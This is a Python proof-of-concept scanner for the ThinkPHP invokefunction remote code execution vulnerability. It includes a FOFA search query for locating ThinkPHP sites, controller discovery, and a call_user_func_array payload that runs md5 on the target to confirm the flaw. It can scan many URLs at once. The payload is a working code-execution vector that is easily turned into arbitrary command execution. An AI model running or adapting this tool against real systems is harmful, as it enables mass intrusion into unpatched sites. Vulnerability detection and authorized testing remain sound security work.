#FOFA: body="thinkphp" | app="thinkphp" | icon_hash="1165838194"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json
import time

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': 'thinkphp_invoke_func_code_exec',
        'vulnerable': False
    }
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    controllers = list()
    try:
        req = requests.get(target, headers=headers, timeout=15, verify=False)
    except:
        print(f"{target}访问失败")
    pattern = '<a[\\s+]href="/[A-Za-z]+'
    matches = re.findall(pattern, req.text)
    for match in matches:
        controllers.append(match.split('/')[1])
    controllers.append('index')
    controllers = list(set(controllers))
    for controller in controllers:
        try:
            payload = 'index.php?s={0}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333'.format(controller)
            vurl = urllib.parse.urljoin(target, payload)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a3" in req.text:
                result['vulnerable'] = True
                result['method'] = 'GET'
                result['url'] = target
                result['payload'] = vurl
            print(result)
        except:
            print(f"{target}访问失败")


def main():
    parser = argparse.ArgumentParser("Thinkphp invokeFunction代码执行漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()